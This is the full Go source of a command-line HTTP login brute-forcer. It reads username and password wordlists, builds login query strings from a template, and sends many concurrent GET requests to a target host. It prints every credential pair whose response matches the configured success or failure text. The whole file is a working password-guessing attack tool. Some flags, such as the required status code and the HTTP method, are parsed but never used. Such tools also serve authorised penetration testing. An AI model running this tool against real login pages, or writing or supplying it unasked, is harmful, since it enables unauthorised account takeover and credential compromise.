package main

import (
	"bufio"
	"fmt"
	"flag"
	"log"
	"net/http"
	"io/ioutil"
	"os"
	"strings"
	"sync"
)

var supported_http_methods = [...] string{ "GET", "POST" }

// Flag variables
var host string
var username string
var username_wordlist string
var password string
var password_wordlist string
var http_method string
var data_format string
var ok_data string
var bad_data string
var ok_status int
var num_threads int
var verbose int

var user_mark string = "%u"
var pass_mark string = "%p"

var wg sync.WaitGroup
var reswg sync.WaitGroup

func usage(){
	fmt.Println("For help, try the -wat flag.")
	os.Exit(1)
}

func spawnHTTPClient(c chan [2]string, result chan [2]string){
	fmt.Println("Thread starting...")
	var ok bool = true

	for ok {
		params, ok := <-c

		if !ok {
			wg.Done()
			return
		}

		var username_in = strings.Replace(data_format, user_mark, params[0], -1)
		var user_data = strings.Replace(username_in, pass_mark, params[1], -1)

		if verbose > 0 {
			fmt.Println("Testing:" + host + "?" + user_data)
		}

		resp, err := http.Get(host + "?" + user_data)

		if err != nil {
			log.Println(err)
			wg.Done()
			return
		}

		body, err := ioutil.ReadAll(resp.Body)
		resp.Body.Close()

		if err != nil {
			log.Println(err)
			wg.Done()
			return
		}

		if verbose > 1 {
			fmt.Println("Response:" + string(body))
		}

		success := true

		if len(bad_data) > 0 {
			if strings.Contains(string(body), bad_data){
				success = false
			}
		}

		if len(ok_data) > 0 {
			if verbose > 1 {
				fmt.Println("Checking for:" + ok_data)
			}
			if !strings.Contains(string(body), ok_data){
				success = false
			}
		}

		if success {
			//fmt.Printf(params[0] + "\t" + params[1] + "\tlooks good?")
			result <- [2]string{params[0], params[1]}
		}
	}
	wg.Done()
}

func catchResults(c chan [2]string){
	for user_pass := range c {
		fmt.Println(user_pass[0] + "\t" + user_pass[1] + "\t" + "looks good.")
	}
	reswg.Done()
}

func main(){
	// Gather flags
	flag.StringVar(&host, "h", "", "Target host to connect to. Ex: localhost:8080/test.html")
	flag.StringVar(&username, "u", "admin", "username to bruteforce against.")
	flag.StringVar(&username_wordlist, "U", "", "Username wordlist to bruteforce with.")
	flag.StringVar(&password, "p", "", "password to bruteforce against.")
	flag.StringVar(&password_wordlist, "w", "", "Password wordlist to bruteforce with.")
	flag.StringVar(&http_method, "m", "GET", "Unsupported! HTTP Method to login with.")
	flag.StringVar(&data_format, "f", "username=%u&password=%p",
			"HTTP payload data format. %u = username, %p = password.")
	flag.StringVar(&ok_data, "ok", "", "Data to search for, indicating successful login.")
	flag.StringVar(&bad_data, "bad", "", "Data to search for, indicating UNSUCCESSFUL login.")
	flag.IntVar(&ok_status, "status", 200, "Status code that must be matched on successful login. Default:200")
	flag.IntVar(&num_threads, "t", 10, "Number of threads to use.")
	flag.IntVar(&verbose, "V", 0, "Verbosity.")

	flag.Parse()

	if len(host) == 0 {
		fmt.Println("No host specified.")
		flag.PrintDefaults()
		return
	}

	if len(password) == 0 && len(password_wordlist) == 0 {
		fmt.Println("No password  or password wordlist specified.")
	}

	fmt.Printf("Connecting...\n" +
		"Host:%v\n" +
		"Threads:%v\n", host, num_threads)

	// Specify looping over usernames later
	usernames_list := make([]string, 0)
	passwords_list := make([]string, 0)

	if len(username) > 0 {
		usernames_list = append(usernames_list, username)
	}
	if len(password) > 0 {
		passwords_list = append(passwords_list, password)
	}

	if len(username_wordlist) > 0 {
		f, err := os.Open(username_wordlist)
		if err != nil {
			log.Fatal(err)
		}
		defer f.Close()

		scanner := bufio.NewScanner(f)
		for scanner.Scan(){
			usernames_list = append(usernames_list, scanner.Text())
		}
		if err := scanner.Err(); err != nil {
			log.Fatal(err)
		}
	}

	if len(password_wordlist) > 0 {
		f, err := os.Open(password_wordlist)
		if err != nil {
			log.Fatal(err)
		}
		defer f.Close()

		scanner := bufio.NewScanner(f)
		for scanner.Scan() {
			passwords_list = append(passwords_list, scanner.Text())
		}

		if err := scanner.Err(); err != nil {
			log.Fatal(err)
		}
	}

	if len(passwords_list) == 0 {
		fmt.Println("No password supplied.")
		flag.Usage()
	}

	cred_channel := make(chan [2]string, num_threads)
	result_channel := make(chan [2]string, num_threads)

	// For printing results before we exit.
	reswg.Add(1)
	go catchResults(result_channel)

	// For bruteforcing all of the results.
	for i := 0; i < num_threads; i++ {
		wg.Add(1)
		go spawnHTTPClient(cred_channel, result_channel)
	}

	//Begin supplying data.
	for i := 0; i < len(usernames_list); i++ {
		for j := 0; j < len(passwords_list); j++ {
			cred_channel <- [2]string{usernames_list[i],passwords_list[j]}
		}
	}

	close(cred_channel)
	wg.Wait()
	close(result_channel)
	reswg.Wait()
}
